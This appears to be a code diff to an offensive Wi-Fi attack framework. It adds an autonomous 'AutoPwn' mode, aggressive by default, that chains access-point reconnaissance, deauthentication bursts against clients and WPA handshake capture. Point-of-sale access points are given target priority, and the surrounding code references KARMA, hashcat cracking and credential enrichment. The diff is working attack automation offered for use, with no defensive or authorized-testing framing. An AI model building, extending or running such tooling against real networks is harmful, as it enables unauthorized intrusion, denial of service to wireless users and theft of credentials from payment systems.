@@ -64,7 +64,8 @@ class AttackOrchestrator:
                  enable_cred_enrichment=False,
                  enable_hashcat=False, hashcat_wordlist=None,
                  enable_vlan_scan=False,
-                 plugins=None, plugins_dir=None):
+                 plugins=None, plugins_dir=None,
+                 enable_autopwn=False, autopwn_config=None):
         self.monitor_iface = monitor_iface
         self.ap_iface = ap_iface
         self.channels = channels or CHANNELS_24GHZ
@@ -147,6 +148,11 @@ class AttackOrchestrator:
         # Event bus for lifecycle events
         self._event_bus = get_event_bus()
 
+        # AutoPwn mode
+        self.enable_autopwn = enable_autopwn
+        self._autopwn_config = autopwn_config
+        self._autopwn_engine = None
+
         self.running = False
 
     def load_plugins(self, plugin_dirs=None):
@@ -194,6 +200,67 @@ class AttackOrchestrator:
         """Return the PluginManager instance (or None if not initialized)."""
         return self._plugin_manager
 
+    async def start_autopwn(self):
+        """
+        Start the autonomous attack engine (async state machine).
+
+        Creates an AutoPwnEngine instance, wires it to the existing
+        ReconEngine/DeauthEngine/HandshakeCapture via asyncio.to_thread()
+        wrappers, and runs the state machine loop.
+
+        This is the modern entry point. The legacy start() method will
+        delegate here if enable_autopwn is True.
+        """
+        from .autopwn_engine import AutoPwnEngine, AutoPwnConfig, AutoPwnMode
+
+        config = self._autopwn_config
+        if config is None:
+            config = AutoPwnConfig(
+                mode=AutoPwnMode.AGGRESSIVE,
+                session_dir="logs/autopwn",
+            )
+
+        # Create a scanner adapter that wraps posframework's ReconEngine
+        scanner_adapter = _ReconScannerAdapter(
+            recon=self.recon,
+            db=self.db,
+            timeout=self.recon_duration,
+        )
+
+        self._autopwn_engine = AutoPwnEngine(
+            config=config,
+            wifi_scanner=scanner_adapter,
+            capture_manager=self._capture_manager_adapter(),
+            cracker=None,
+        )
+
+        self.running = True
+
+        # Emit system starting event
+        self._event_bus.emit_sync(EventType.SYSTEM_STARTING, {
+            "monitor_iface": self.monitor_iface,
+            "ap_iface": self.ap_iface,
+            "mode": "autopwn",
+        }, source="orchestrator")
+
+        try:
+            await self._autopwn_engine.start()
+            # Engine runs until stopped externally
+            while self._autopwn_engine.is_running:
+                await asyncio.sleep(1.0)
+        except asyncio.CancelledError:
+            pass
+        finally:
+            if self._autopwn_engine.is_running:
+                await self._autopwn_engine.stop()
+            self.running = False
+
+    def _capture_manager_adapter(self):
+        """Create an adapter for HandshakeCapture if available."""
+        if self.handshakes:
+            return _HandshakeCaptureAdapter(self.handshakes, self.deauth)
+        return None
+
     def _auto_select_target(self):
         """Select target from recon data. POS APs get priority."""
         if self.target_bssid and self.target_ssid and self.target_channel:
@@ -218,7 +285,21 @@ class AttackOrchestrator:
         return True
 
     def start(self):
-        """Execute the full automated attack chain."""
+        """Execute the full automated attack chain.
+
+        If enable_autopwn is True, delegates to start_autopwn() via
+        asyncio.run(). Otherwise runs the legacy synchronous pipeline.
+        """
+        if self.enable_autopwn:
+            import asyncio as _asyncio
+            try:
+                loop = _asyncio.get_running_loop()
+                # Already in async context, create task
+                loop.create_task(self.start_autopwn())
+            except RuntimeError:
+                _asyncio.run(self.start_autopwn())
+            return True
+
         # Lazy imports for optional modules
         from .beacons import KnownBeaconsEngine
         from .karma import KARMAEngine
@@ -621,3 +702,95 @@ class AttackOrchestrator:
             log.info(f"  {i}. {step}")
 
         log.info("=" * 60)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# AutoPwn Adapter Classes
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class _ReconScannerAdapter:
+    """
+    Adapter that wraps posframework's ReconEngine to provide a scan()
+    interface compatible with AutoPwnEngine's wifi_scanner parameter.
+
+    The ReconEngine is synchronous (uses scapy sniff), so the AutoPwnEngine
+    wraps this in asyncio.to_thread().
+    """
+
+    def __init__(self, recon, db, timeout=30):
+        self._recon = recon
+        self._db = db
+        self._timeout = timeout
+
+    def scan(self, channels=None):
+        """
+        Run a recon scan and return results as list of dicts.
+
+        This method is synchronous - AutoPwnEngine wraps it in
+        asyncio.to_thread() automatically.
+        """
+        self._recon.start(timeout=self._timeout)
+        self._recon.stop()
+
+        # Pull APs from the database
+        results = []
+        try:
+            self._db.cursor.execute(
+                'SELECT bssid, ssid, channel, security, rssi '
+                'FROM access_points'
+            )
+            for row in self._db.cursor.fetchall():
+                bssid, ssid, channel, security, rssi = row
+                results.append({
+                    "bssid": bssid,
+                    "ssid": ssid,
+                    "channel": channel,
+                    "encryption": security,
+                    "signal_dbm": rssi or -100,
+                })
+        except Exception as e:
+            log.error(f"ReconScannerAdapter: query failed: {e}")
+
+        return results
+
+
+class _HandshakeCaptureAdapter:
+    """
+    Adapter that wraps posframework's HandshakeCapture and DeauthEngine
+    to provide a capture_manager interface for the attack chain.
+    """
+
+    def __init__(self, handshakes, deauth):
+        self._handshakes = handshakes
+        self._deauth = deauth
+
+    async def capture_pmkid(self, bssid, channel):
+        """Attempt PMKID capture (not yet implemented in posframework)."""
+        return None
+
+    async def start_capture(self, bssid, channel):
+        """Start handshake capture."""
+        pass
+
+    async def send_deauth(self, bssid, client):
+        """Send deauth via the DeauthEngine."""
+        import asyncio
+        await asyncio.to_thread(
+            self._deauth.send_deauth_burst, bssid, client, count=3
+        )
+
+    async def wait_handshake(self, bssid):
+        """Wait for a complete handshake."""
+        import asyncio
+        await asyncio.sleep(5.0)
+        # Check if we have a complete handshake
+        if hasattr(self._handshakes, 'get_complete_for_bssid'):
+            result = self._handshakes.get_complete_for_bssid(bssid)
+            if result:
+                return {"handshake": True, "file": result}
+        return None
+
+    async def stop_capture(self):
+        """Stop capture."""
+        pass
